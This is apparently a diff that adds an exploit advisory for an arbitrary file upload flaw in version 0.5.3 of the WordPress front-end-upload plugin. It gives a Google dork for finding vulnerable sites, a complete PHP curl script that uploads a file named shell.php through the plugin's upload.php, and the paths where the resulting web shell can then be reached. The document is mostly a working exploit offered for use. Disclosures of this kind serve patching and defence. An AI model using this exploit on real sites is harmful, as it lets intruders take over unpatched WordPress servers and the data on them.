@@ -1,0 +1,32 @@
+# Exploit Title: Wordpress front-end-upload 0.5.3 Arbitrary File Upload
+# Google Dork: inurl:wp-content/plugins/front-end-upload/
+# Date: 31/05/2012
+# Exploit Author: Adrien Thierry
+# Vendor Homepage: http://mondaybynoon.com/20120102/announcing-front-end-upload-wordpress-plugin/
+# Software Link: http://downloads.wordpress.org/plugin/front-end-upload.0.5.3.zip
+# Version: 0.5.3
+
+
+*** FRONT-END-UPLOAD PRO is probably vulnerable ***
+
+page upload.php is vulnerable to Remote File Upload. Code :
+
+<?php
+$u="whatelse.php";
+$c = curl_init("http://server/wp-content/plugins/front-end-upload/upload.php");
+curl_setopt($c, CURLOPT_POST, true);
+curl_setopt($c, CURLOPT_POSTFIELDS,
+array('file'=>"@$u",'name'=>"shell.php"));
+curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+$e = curl_exec($c);
+curl_close($c);
+echo $e; 
+?>
+
+
+If plugin isn't active, shell could be found at :
+	http://server/wp-content/plugins/front-end-upload/FEU_DESTINATION_DIR/shell.php
+else
+	http://server/wp-content/uploads/iti_feu_uploads/shell.php
+	
+#########################################################################################
